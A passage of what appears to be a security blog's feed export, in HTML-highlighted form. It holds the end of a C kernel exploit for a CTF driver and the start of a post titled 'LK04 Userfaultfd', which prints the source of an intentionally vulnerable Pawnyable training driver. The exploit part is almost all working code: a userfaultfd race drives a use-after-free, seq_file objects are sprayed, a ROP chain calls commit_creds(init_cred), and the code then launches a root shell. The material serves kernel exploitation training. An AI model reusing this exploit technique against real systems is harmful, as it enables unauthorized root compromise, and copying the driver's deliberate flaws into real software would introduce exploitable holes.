class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[*] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">/* to run the exp on the specific core only */</span><span class="token keyword">void</span> <span class="token function">bind_cpu</span><span class="token punctuation">(</span><span class="token keyword">int</span> core<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">cpu_set_t</span> cpu_set<span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] set cpu affinity"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">CPU_ZERO</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">CPU_SET</span><span class="token punctuation">(</span>core<span class="token punctuation">,</span> <span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sched_setaffinity</span><span class="token punctuation">(</span><span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token class-name">pthread_t</span> monitor_thread<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">registerUserFaultFd</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span> addr<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> len<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>handler<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">long</span> uffd<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">uffdio_api</span> uffdio_api<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">uffdio_register</span> uffdio_register<span class="token punctuation">;</span>    <span class="token keyword">int</span> s<span class="token punctuation">;</span>    <span class="token comment">/* Create and enable userfaultfd object */</span>    uffd <span class="token operator">=</span> <span class="token function">syscall</span><span class="token punctuation">(</span>__NR_userfaultfd<span class="token punctuation">,</span> O_CLOEXEC <span class="token operator">|</span> O_NONBLOCK<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>uffd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"userfaultfd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    uffdio_api<span class="token punctuation">.</span>api <span class="token operator">=</span> UFFD_API<span class="token punctuation">;</span>    uffdio_api<span class="token punctuation">.</span>features <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_API<span class="token punctuation">,</span> <span class="token operator">&amp;</span>uffdio_api<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"ioctl-UFFDIO_API"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    uffdio_register<span class="token punctuation">.</span>range<span class="token punctuation">.</span>start <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> addr<span class="token punctuation">;</span>    uffdio_register<span class="token punctuation">.</span>range<span class="token punctuation">.</span>len <span class="token operator">=</span> len<span class="token punctuation">;</span>    uffdio_register<span class="token punctuation">.</span>mode <span class="token operator">=</span> UFFDIO_REGISTER_MODE_MISSING<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_REGISTER<span class="token punctuation">,</span> <span class="token operator">&amp;</span>uffdio_register<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"ioctl-UFFDIO_REGISTER"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    s <span class="token operator">=</span> <span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>monitor_thread<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> handler<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> uffd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"pthread_create"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> fd<span class="token punctuation">;</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x400</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span> data<span class="token punctuation">[</span><span class="token number">0x400</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> spray<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> seqfd<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">request_t</span><span class="token punctuation">&#123;</span><span class="token class-name">size_t</span> size<span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>req<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> size<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>req<span class="token punctuation">.</span>size<span class="token operator">=</span>size<span class="token punctuation">;</span>req<span class="token punctuation">.</span>data<span class="token operator">=</span>data<span class="token punctuation">;</span><span class="token keyword">int</span> r<span class="token operator">=</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_ADD<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>r<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"add"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">del</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>req<span class="token punctuation">.</span>size<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>req<span class="token punctuation">.</span>data<span class="token operator">=</span>data<span class="token punctuation">;</span><span class="token keyword">int</span> r<span class="token operator">=</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_DEL<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>r<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"del"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">char</span> <span class="token operator">*</span>copy_page <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">fault_handler_thread</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>arg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">static</span> <span class="token keyword">char</span> <span class="token operator">*</span>copy_page <span class="token operator">=</span> buf<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">long</span> copy_size <span class="token operator">=</span> <span class="token number">0x1000</span><span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">uffd_msg</span> msg<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">uffdio_copy</span> uffdio_copy<span class="token punctuation">;</span>    <span class="token keyword">long</span> uffd<span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token keyword">int</span> fault_cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    uffd <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> arg<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">pollfd</span> pollfd<span class="token punctuation">;</span>    pollfd<span class="token punctuation">.</span>fd <span class="token operator">=</span> uffd<span class="token punctuation">;</span>    pollfd<span class="token punctuation">.</span>events <span class="token operator">=</span> POLLIN<span class="token punctuation">;</span>    <span class="token function">bind_cpu</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] fault_handler_thread waiting for page fault..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pollfd<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"poll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>pollfd<span class="token punctuation">.</span>revents <span class="token operator">&amp;</span> POLLERR <span class="token operator">||</span> pollfd<span class="token punctuation">.</span>revents <span class="token operator">&amp;</span> POLLHUP<span class="token punctuation">)</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"revents"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>msg<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"read msg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>                 <span class="token keyword">if</span> <span class="token punctuation">(</span>msg<span class="token punctuation">.</span>event <span class="token operator">!=</span> UFFD_EVENT_PAGEFAULT<span class="token punctuation">)</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"Unexpected event on userfaultfd\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[t][*] fault_handler_thread(): "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"POLLIN = %d; POLLERR = %d\n"</span><span class="token punctuation">,</span>                 <span class="token punctuation">(</span>pollfd<span class="token punctuation">.</span>revents <span class="token operator">&amp;</span> POLLIN<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token punctuation">(</span>pollfd<span class="token punctuation">.</span>revents <span class="token operator">&amp;</span> POLLERR<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[t][*] UFFD_EVENT_PAGEFAULT event: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"flags = %llx; "</span><span class="token punctuation">,</span> msg<span class="token punctuation">.</span>arg<span class="token punctuation">.</span>pagefault<span class="token punctuation">.</span>flags<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"address = %llx\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">.</span>arg<span class="token punctuation">.</span>pagefault<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//your code...</span><span class="token keyword">switch</span><span class="token punctuation">(</span>fault_cnt<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[t][*] UAF write"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">del</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">0x20</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/stat"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"spray"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>seqfd<span class="token operator">=</span>spray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>        uffdio_copy<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> copy_page<span class="token punctuation">;</span>        uffdio_copy<span class="token punctuation">.</span>dst <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> msg<span class="token punctuation">.</span>arg<span class="token punctuation">.</span>pagefault<span class="token punctuation">.</span>address <span class="token operator">&amp;</span>                                              <span class="token operator">~</span><span class="token punctuation">(</span>copy_size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        uffdio_copy<span class="token punctuation">.</span>len <span class="token operator">=</span> copy_size<span class="token punctuation">;</span>        uffdio_copy<span class="token punctuation">.</span>mode <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        uffdio_copy<span class="token punctuation">.</span>copy <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_COPY<span class="token punctuation">,</span> <span class="token operator">&amp;</span>uffdio_copy<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"ioctl-UFFDIO_COPY"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">bind_cpu</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token operator">*</span>page<span class="token punctuation">;</span>  page <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0x3000</span><span class="token punctuation">,</span> PROT_READ <span class="token operator">|</span> PROT_WRITE<span class="token punctuation">,</span>              MAP_PRIVATE <span class="token operator">|</span> MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">registerUserFaultFd</span><span class="token punctuation">(</span>page<span class="token punctuation">,</span> <span class="token number">0x3000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>fault_handler_thread<span class="token punctuation">)</span><span class="token punctuation">;</span>fd<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/DASKERNEL"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>fd<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] Proc Opened"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf<span class="token operator">=</span>ADD_RSP_0x130_PPP_RET<span class="token punctuation">;</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> page<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x60</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%02x: 0x%016lx\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>page <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+=</span><span class="token number">16</span><span class="token punctuation">;</span><span class="token function">__asm__</span><span class="token punctuation">(</span><span class="token string">"mov r15,   0xbeefdead;"</span><span class="token string">"mov r14,   0xbeefdead;"</span><span class="token string">"mov r13,   0xbeefdead;"</span><span class="token string">"mov r12,   POP_RDI_RET;"</span><span class="token string">"mov rbp,   init_cred;"</span><span class="token string">"mov rbx,   POP_RDX_RET;"</span><span class="token comment">//r11</span><span class="token string">"mov r10,   commit_creds;"</span><span class="token string">"mov r9,    swapgs_restore_regs_and_return_to_usermode;"</span><span class="token string">"mov r8,    0x99999999;"</span><span class="token string">"xor rax,   rax;"</span><span class="token string">"mov rdi,   seqfd;"</span><span class="token string">"mov rsi,   rsp;"</span><span class="token string">"mov rdx,   8;"</span><span class="token string">"syscall"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/5b6bf9d49f5d500c2a459a27e2886904_MD5.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>LK04 Userfaultfd</title>
      <link href="/2024/03/14/LK04%20Userfaultfd/"/>
      <url>/2024/03/14/LK04%20Userfaultfd/</url>
      
        <content type="html"><![CDATA[<p>LKMæºç ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/cdev.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/fs.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/kernel.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/module.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/random.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/slab.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/uaccess.h></span></span><span class="token function">MODULE_LICENSE</span><span class="token punctuation">(</span><span class="token string">"GPL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MODULE_AUTHOR</span><span class="token punctuation">(</span><span class="token string">"ptr-yudai"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MODULE_DESCRIPTION</span><span class="token punctuation">(</span><span class="token string">"Fleckvieh - Vulnerable Kernel Driver for Pawnyable"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DEVICE_NAME</span> <span class="token string">"fleckvieh"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_ADD</span> <span class="token expression"><span class="token number">0xf1ec0001</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_DEL</span> <span class="token expression"><span class="token number">0xf1ec0002</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_GET</span> <span class="token expression"><span class="token number">0xf1ec0003</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_SET</span> <span class="token expression"><span class="token number">0xf1ec0004</span></span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> id<span class="token punctuation">;</span>  <span class="token class-name">size_t</span> size<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token class-name">request_t</span><span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> id<span class="token punctuation">;</span>  <span class="token class-name">size_t</span> size<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>  <span class="token keyword">struct</span> <span class="token class-name">list_head</span> list<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> blob_list<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">module_open</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>filp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">/* Allocate list head */</span>  filp<span class="token operator">-></span>private_data <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kmalloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span><span class="token punctuation">)</span><span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token operator">!</span>filp<span class="token operator">-></span>private_data<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>  <span class="token function">INIT_LIST_HEAD</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span><span class="token operator">*</span><span class="token punctuation">)</span>filp<span class="token operator">-></span>private_data<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">module_close</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>filp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">struct</span> <span class="token class-name">list_head</span> <span class="token operator">*</span>top<span class="token punctuation">;</span>  blob_list <span class="token operator">*</span>itr<span class="token punctuation">,</span> <span class="token operator">*</span>tmp<span class="token punctuation">;</span>  <span class="token comment">/* Remove everything */</span>  top <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span><span class="token operator">*</span><span class="token 